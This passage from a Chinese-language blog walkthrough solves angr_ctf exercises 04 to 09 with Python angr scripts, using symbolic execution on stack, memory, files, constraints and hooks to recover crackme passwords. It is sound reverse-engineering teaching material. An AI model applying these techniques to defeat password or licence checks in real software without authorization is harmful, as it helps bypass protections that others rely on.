<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    binary_path = <span class="string">&#x27;./04_angr_symbolic_stack&#x27;</span></span><br><span class="line">    project = angr.Project(binary_path)</span><br><span class="line"></span><br><span class="line">    start_addr = <span class="number">0x08048697</span> <span class="comment">#scanf之后的地址</span></span><br><span class="line">    initial_state = project.factory.blank_state(addr=start_addr)</span><br><span class="line"></span><br><span class="line">    initial_state.regs.ebp = initial_state.regs.esp <span class="comment"># 初始化栈，令ebp等于esp</span></span><br><span class="line"></span><br><span class="line">    password0 = claripy.BVS(<span class="string">&#x27;password0&#x27;</span>, <span class="number">32</span>) <span class="comment"># 初始化两个位向量</span></span><br><span class="line">    password1 = claripy.BVS(<span class="string">&#x27;password1&#x27;</span>, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    padding_length_in_bytes = <span class="number">8</span> <span class="comment"># 填充栈，8字节，2个int数据</span></span><br><span class="line">    initial_state.regs.esp -= padding_length_in_bytes </span><br><span class="line"></span><br><span class="line">    initial_state.stack_push(password0) <span class="comment"># 将位向量压入栈中</span></span><br><span class="line">    initial_state.stack_push(password1)</span><br><span class="line"></span><br><span class="line">    simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Good Job&#x27;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Try again&#x27;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        solution0 = solution_state.se.<span class="built_in">eval</span>(password0)</span><br><span class="line">        solution1 = solution_state.se.<span class="built_in">eval</span>(password1)</span><br><span class="line"></span><br><span class="line">        solution = <span class="string">&#x27;%u %u&#x27;</span> % (solution0, solution1)</span><br><span class="line">        <span class="built_in">print</span>(solution)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>



<h2 id="05-angr-symbolic-memory"><a href="#05-angr-symbolic-memory" class="headerlink" title="05_angr_symbolic_memory"></a>05_angr_symbolic_memory</h2><p>IDA：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/03/30/174e359750faabcd.png" alt="main"></p>
<p>发现这次输入的内容被存到了4个地方，这4个地方都是.bss段上的内存（unk开头的指针以及user_input），之后计算并比较；和之前2题一样，这次需要的是符号化内存；</p>
<p>代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    binary_path = <span class="string">&#x27;./05_angr_symbolic_memory&#x27;</span></span><br><span class="line">    project = angr.Project(binary_path)</span><br><span class="line"></span><br><span class="line">    start_addr = <span class="number">0x08048601</span></span><br><span class="line">    initial_state = project.factory.blank_state(addr=start_addr)</span><br><span class="line"></span><br><span class="line">    password0 = claripy.BVS(<span class="string">&#x27;password0&#x27;</span>, <span class="number">64</span>) <span class="comment"># 64 = 8(8个字符) * 1(每个字符一字节) * 8(每个字节8比特)</span></span><br><span class="line">    password1 = claripy.BVS(<span class="string">&#x27;password1&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">    password2 = claripy.BVS(<span class="string">&#x27;password2&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">    password3 = claripy.BVS(<span class="string">&#x27;password3&#x27;</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">    password0_addr = <span class="number">0x09FD92A0</span></span><br><span class="line">    password1_addr = <span class="number">0x09FD92A8</span></span><br><span class="line">    password2_addr = <span class="number">0x09FD92B0</span></span><br><span class="line">    password3_addr = <span class="number">0x09FD92B8</span></span><br><span class="line"></span><br><span class="line">    initial_state.memory.store(password0_addr, password0) <span class="comment"># 将位向量存入内存</span></span><br><span class="line">    initial_state.memory.store(password1_addr, password1)</span><br><span class="line">    initial_state.memory.store(password2_addr, password2)</span><br><span class="line">    initial_state.memory.store(password3_addr, password3)</span><br><span class="line"></span><br><span class="line">    simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        solution0 = solution_state.se.<span class="built_in">eval</span>(password0)</span><br><span class="line">        solution1 = solution_state.se.<span class="built_in">eval</span>(password1)</span><br><span class="line">        solution2 = solution_state.se.<span class="built_in">eval</span>(password2)</span><br><span class="line">        solution3 = solution_state.se.<span class="built_in">eval</span>(password3)</span><br><span class="line">        solution = long_to_bytes(solution0)+<span class="string">b&#x27; &#x27;</span>+long_to_bytes(solution1)+<span class="string">b&#x27; &#x27;</span>+long_to_bytes(solution2)+<span class="string">b&#x27; &#x27;</span>+long_to_bytes(solution3)</span><br><span class="line">        <span class="built_in">print</span>(solution.decode())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<blockquote>
<p>initial_state.memory.store(地址,数据)  -&gt;  初始化内存地址中的数据</p>
<p>long_to_byte函数 -&gt; 规范输出</p>
</blockquote>
<h2 id="06-angr-symbolic-dynamic-memory"><a href="#06-angr-symbolic-dynamic-memory" class="headerlink" title="06_angr_symbolic_dynamic_memory"></a>06_angr_symbolic_dynamic_memory</h2><p>IDA：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/03/30/4b267144916e1411.png" alt="main"></p>
<p>可以看到这次用了malloc分配了动态内存，而scanf输入则直接放到了这些内存上，下面步骤都和之前一样，所以这次要做的就是符号化动态内存；但动态内存没有固定的地址，所以需要用到buffer在.bss段上的指针；Angr可以不用创建新内存(malloc),直接指向内存中一个任意位置即可；</p>
<p>代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    binary_path = <span class="string">&#x27;../program/06_angr_symbolic_dynamic_memory&#x27;</span></span><br><span class="line">    project = angr.Project(binary_path)</span><br><span class="line"></span><br><span class="line">    start_addr = <span class="number">0x08048699</span></span><br><span class="line">    initial_state = project.factory.blank_state(addr=start_addr)</span><br><span class="line"></span><br><span class="line">    password0 = claripy.BVS(<span class="string">&#x27;password0&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">    password1 = claripy.BVS(<span class="string">&#x27;password1&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">    fake0_addr = <span class="number">0x09FD9160</span> <span class="comment"># 伪造malloc得来的内存</span></span><br><span class="line">    fake1_addr = <span class="number">0x09FD9180</span></span><br><span class="line"></span><br><span class="line">    buffer0_addr = <span class="number">0x09FD92AC</span> <span class="comment"># 指向伪造内存的指针</span></span><br><span class="line">    buffer1_addr = <span class="number">0x09FD92B4</span></span><br><span class="line">    initial_state.memory.store(buffer0_addr, fake0_addr, endness=project.arch.memory_endness) <span class="comment"># 将指针指向伪造的内存</span></span><br><span class="line">    initial_state.memory.store(buffer1_addr, fake1_addr, endness=project.arch.memory_endness)</span><br><span class="line"></span><br><span class="line">    initial_state.memory.store(fake0_addr, password0) <span class="comment"># 将伪造的内存符号化</span></span><br><span class="line">    initial_state.memory.store(fake1_addr, password1)</span><br><span class="line"></span><br><span class="line">    simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        solution0 = solution_state.se.<span class="built_in">eval</span>(password0)</span><br><span class="line">        solution1 = solution_state.se.<span class="built_in">eval</span>(password1)</span><br><span class="line"></span><br><span class="line">        solution = long_to_bytes(solution0) + <span class="string">b&#x27; &#x27;</span> + long_to_bytes(solution1)</span><br><span class="line">        <span class="built_in">print</span>(solution)</span><br><span class="line">        <span class="built_in">print</span>(solution.decode())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<blockquote>
<p>initial_state.memory.store(地址,数据,endness = 数据字节顺序)  -&gt;  设置初始化内存数据</p>
<p>project.arch.memory_endness  -&gt;  指的是内存字节顺序</p>
</blockquote>
<h2 id="07-angr-symbolic-file"><a href="#07-angr-symbolic-file" class="headerlink" title="07_angr_symbolic_file"></a>07_angr_symbolic_file</h2><p>IDA：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/03/30/a61f5ee41e1b482f.png" alt="main"></p>
<p>ignore_me函数：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/03/30/101a56701648fc3c.png" alt="ignore_me"></p>
<p>输入的内容先保存到buffer里，接着用ignore_me函数将buffer里的内容存到叫做MRXJKZYR.txt的新建文件里；之后返回到主函数，初始化buffer；然后打开这个新建文件，读取里面的内容再到buffer里，最后运算比较；这次需要做的便是符号化文件；</p>
<p>代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    binary_path = <span class="string">&#x27;../program/07_angr_symbolic_file&#x27;</span></span><br><span class="line">    project = angr.Project(binary_path)</span><br><span class="line"></span><br><span class="line">    start_addr = <span class="number">0x080488EA</span></span><br><span class="line"></span><br><span class="line">    filename = <span class="string">&#x27;MRXJKZYR.txt&#x27;</span> <span class="comment"># 文件名称</span></span><br><span class="line">    symbolic_file_size_bytes = <span class="number">64</span> <span class="comment"># 文件大小(字节)</span></span><br><span class="line"></span><br><span class="line">    password = claripy.BVS(<span class="string">&#x27;password&#x27;</span>, symbolic_file_size_bytes * <span class="number">8</span>) <span class="comment"># 初始化位向量</span></span><br><span class="line">    password_file = angr.SimFile(filename, content=password, size=symbolic_file_size_bytes) <span class="comment"># 符号化文件</span></span><br><span class="line"></span><br><span class="line">    initial_state = project.factory.blank_state(addr=start_addr, fs=&#123;filename: password_file&#125;) <span class="comment"># 再初始状态中添加一个虚拟的文件系统</span></span><br><span class="line">    simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        solution = long_to_bytes(solution_state.solver.<span class="built_in">eval</span>(password))</span><br><span class="line">        <span class="built_in">print</span>(solution.decode())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find solution&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<blockquote>
<p>angr.storage.SimFile(文件名,文件内容, size = 文件大小)  -&gt;  创建一个模拟文件,当有被执行的程序fopen 打开文件时,可以控制其里面的内容</p>
<p>initial_state.posix.fs  -&gt;  状态上下文的文件系统对象</p>
</blockquote>
<h2 id="08-angr-constraints"><a href="#08-angr-constraints" class="headerlink" title="08_angr_constraints"></a>08_angr_constraints</h2><p>IDA：</p>
<p><img src="https://s2.loli.net/2022/03/31/PeBklpfoj2Z5TRz.png" alt="main"></p>
<p>输入字串后进行加密，之后经过检查函数判断；</p>
<p>这次可以控制输入的内容最后导致password地址的字串是否变为了正确的；</p>
<p>代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    binary_path = <span class="string">&#x27;./08_angr_constraints&#x27;</span></span><br><span class="line">    project = angr.Project(binary_path)</span><br><span class="line"></span><br><span class="line">    start_addr = <span class="number">0x08048625</span> <span class="comment"># 在输入函数之后</span></span><br><span class="line">    initial_state = project.factory.blank_state(addr=start_addr)</span><br><span class="line"></span><br><span class="line">    password = claripy.BVS(<span class="string">&#x27;password&#x27;</span>, <span class="number">16</span>*<span class="number">8</span>)</span><br><span class="line">    password_addr = <span class="number">0x0804A050</span></span><br><span class="line">    initial_state.memory.store(password_addr, password)</span><br><span class="line"></span><br><span class="line">    simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">    addr_to_check_constraint = <span class="number">0x08048669</span> <span class="comment"># 在检查函数之前</span></span><br><span class="line">    simulation.explore(find=addr_to_check_constraint)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        constrained_parameter_addr = <span class="number">0x0804A050</span> <span class="comment"># 加密后的password的地址</span></span><br><span class="line">        constrained_parameter_size_bytes = <span class="number">16</span>   <span class="comment"># password的长度(字节)</span></span><br><span class="line">        constrained_parameter_bitvector = solution_state.memory.load(constrained_parameter_addr, constrained_parameter_size_bytes)  <span class="comment"># 从内存中加载password</span></span><br><span class="line"></span><br><span class="line">        constrained_parameter_desired_value = <span class="string">&#x27;MRXJKZYRKMKENFZR&#x27;</span>  <span class="comment"># reference string</span></span><br><span class="line"></span><br><span class="line">        constrained_expression = constrained_parameter_bitvector == constrained_parameter_desired_value                               <span class="comment"># 约束表达式</span></span><br><span class="line"></span><br><span class="line">        solution_state.add_constraints(constrained_expression)    <span class="comment"># 添加约束</span></span><br><span class="line"></span><br><span class="line">        solution = long_to_bytes(solution_state.se.<span class="built_in">eval</span>(password))</span><br><span class="line">        <span class="built_in">print</span>(solution.decode())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the sokution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<blockquote>
<p>solution_state.memory.load(内存地址,内存大小)  -&gt;  加载内存</p>
<p>solution_state.add_constraints(约束条件)  -&gt;  添加约束条件</p>
</blockquote>
<h2 id="09-angr-hooks"><a href="#09-angr-hooks" class="headerlink" title="09_angr_hooks"></a>09_angr_hooks</h2><p>IDA：</p>
<p><img src="https://s2.loli.net/2022/03/31/Dent7jbU4ZFTHyO.png" alt="main"></p>
<p>分别输入两次加密比较；</p>
<p>这题是要求注入，模拟equals函数的功能：</p>
<p><img src="https://s2.loli.net/2022/03/31/imzJ3LxMCV2qPHn.png" alt="equals"></p>
<p>注入地址当然就是调用这个函数的地址；angr里的注入类似于CE，开辟一块新区块，然后在这里写入注入内容，最后跳回注入地址的后一地址；</p>
<p>代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    binary_path = <span class="string">&#x27;./09_angr_hooks&#x27;</span></span><br><span class="line">    project = angr.Project(binary_path)</span><br><span class="line"></span><br><span class="line">    initial_state = project.factory.entry_state()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 绕过函数的地址</span></span><br><span class="line">    check_equals_caller_addr = <span class="number">0x080486A9</span></span><br><span class="line">    <span class="comment"># 通过 hook 跳过目标函数的长度</span></span><br><span class="line">    instruction_to_skip_length = <span class="number">0x080486BB</span> - <span class="number">0x080486A9</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建一个 hook 函数</span></span><br><span class="line">    <span class="comment"># 参数为绕过函数的地址,绕过函数长度</span></span><br><span class="line"><span class="meta">    @project.hook(<span class="params">check_equals_caller_addr, length = instruction_to_skip_length</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">skip_check_equals</span>(<span class="params">state</span>):</span></span><br><span class="line">        user_input_buffer_addr = <span class="number">0x0804A054</span>  <span class="comment"># 保存输入变量地址</span></span><br><span class="line">        user_input_buffer_length = <span class="number">16</span>  <span class="comment"># 第一个 scanf 的输入长度，此处为字节大小</span></span><br><span class="line">        <span class="comment"># 将输入载入内存</span></span><br><span class="line">        user_input_string = state.memory.load(</span><br><span class="line">            user_input_buffer_addr,</span><br><span class="line">            user_input_buffer_length</span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># 目的字符串</span></span><br><span class="line">        check_against_string = <span class="string">&#x27;MRXJKZYRKMKENFZB&#x27;</span></span><br><span class="line">        <span class="comment"># 创建判断条件 -&gt; 字符串的比较</span></span><br><span class="line">        state.regs.eax = claripy.If(</span><br><span class="line">            user_input_string == check_against_string,</span><br><span class="line">            claripy.BVV(<span class="number">1</span>, <span class="number">32</span>),  <span class="comment"># 程序的返回值是给寄存器 eax 保存</span></span><br><span class="line">            claripy.BVV(<span class="number">0</span>, <span class="number">32</span>)  <span class="comment"># eax 为 32 bit 的寄存器，所以大小设置为 32</span></span><br><span class="line">        )  <span class="comment"># claripy.BVV(返回数据,返回 bit 大小)</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line">    <span class="comment"># 开始模拟</span></span><br><span class="line">    simulation = project.factory.simgr(initial_state)</span><br><span class="line">    simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        solution = solution_state.posix.dumps(sys.stdin.fileno())</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(solution.decode())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span 